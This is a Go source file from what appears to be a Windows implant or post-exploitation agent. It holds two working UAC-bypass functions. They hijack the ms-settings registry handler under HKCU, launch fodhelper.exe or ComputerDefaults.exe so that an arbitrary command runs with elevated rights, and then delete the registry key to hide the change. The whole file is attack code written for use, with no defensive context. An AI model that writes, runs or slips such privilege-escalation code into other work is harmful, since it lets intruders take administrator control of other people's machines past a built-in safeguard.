//go:build windows

package agent

import (
	"fmt"
)

// uacBypassCMLUA elevates via the fodhelper.exe registry hijack.
// Works on Windows 10/11 including 24H2. Requires medium IL.
func uacBypassCMLUA(cmd string) string {
	return uacFodHelper(cmd)
}

// uacFodHelper uses fodhelper.exe registry hijack for UAC bypass.
// Writes to HKCU\Software\Classes\ms-settings\shell\open\command.
func uacFodHelper(cmd string) string {
	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`
	setCmd := fmt.Sprintf(`reg add "%s" /v "" /t REG_SZ /d "%s" /f`, regPath, cmd)
	setDel := fmt.Sprintf(`reg add "%s" /v "DelegateExecute" /t REG_SZ /d "" /f`, regPath)
	runShell(setCmd)  //nolint:errcheck
	runShell(setDel)  //nolint:errcheck
	out, _ := runShell(`start fodhelper.exe`)
	runShell(`reg delete "HKCU\Software\Classes\ms-settings" /f`) //nolint:errcheck
	return fmt.Sprintf("[+] uac-fodhelper triggered: %s\n%s", cmd, out)
}

// uacComputerDefaults uses ComputerDefaults.exe hijack (similar to fodhelper).
func uacComputerDefaults(cmd string) string {
	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`
	runShell(fmt.Sprintf(`reg add "%s" /v "" /t REG_SZ /d "%s" /f`, regPath, cmd))       //nolint:errcheck
	runShell(fmt.Sprintf(`reg add "%s" /v "DelegateExecute" /t REG_SZ /d "" /f`, regPath)) //nolint:errcheck
	out, _ := runShell(`start C:\Windows\System32\ComputerDefaults.exe`)
	runShell(`reg delete "HKCU\Software\Classes\ms-settings" /f`) //nolint:errcheck
	return fmt.Sprintf("[+] uac-computerdefaults triggered: %s\n%s", cmd, out)
}
